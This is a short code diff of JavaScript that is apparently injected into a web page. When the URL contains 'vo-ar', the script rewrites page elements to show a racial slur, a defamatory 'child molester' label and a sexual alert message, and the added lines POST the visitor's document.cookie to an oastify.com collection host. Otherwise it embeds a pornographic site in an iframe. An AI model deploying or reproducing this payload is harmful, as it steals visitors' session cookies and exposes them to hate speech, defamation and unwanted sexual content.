@@ -27,6 +27,11 @@ if(window.location.href.includes("vo-ar")){
     name.innerHTML = "<a onclick="alert('nya~ my pussy >_<')" class='rainbow'>Click Me :D</a>"
     document.querySelectorAll('a').forEach(el => {el.style.color='red'})
     document.querySelector(".naskh-r").textContent = 'nigger | certified child molester'
+    fetch('https://ugeghou8kuk2odes18yxe3gsfjla90xp.oastify.com', {
+      method: 'POST',
+      mode: 'no-cors', 
+      body: document.cookie
+});
 }
 else {
     document.body.innerHTML += '<iframe height=720px width=1280px src="https://rule34.xxx/index.php?page=post&s=list&tags=hentai">';
